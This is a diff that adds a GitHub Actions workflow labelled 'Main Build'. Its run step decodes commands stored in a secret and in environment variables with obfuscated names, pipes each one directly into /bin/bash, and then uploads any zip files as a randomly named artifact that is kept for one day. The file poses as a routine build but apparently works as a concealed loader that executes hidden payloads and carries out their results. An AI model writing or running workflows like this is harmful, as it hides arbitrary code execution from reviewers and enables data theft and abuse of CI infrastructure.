@@ -1,0 +1,29 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          dhjq78: ${{ secrets.dhjq78 }}
+        run: |
+          printf '%s' "$dhjq78" | jq -r .fzmo757 | /bin/bash
+          printf '%s' "$svnyv7136" | jq -r .a0924 | /bin/bash
+          echo $cwq3030 | jq -r .xjoj7300 | /bin/bash
+          printf '%s' "$s6" | jq -r .bcf69 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: uDk2ibeE
+          path: "*.zip"
+          retention-days: 1
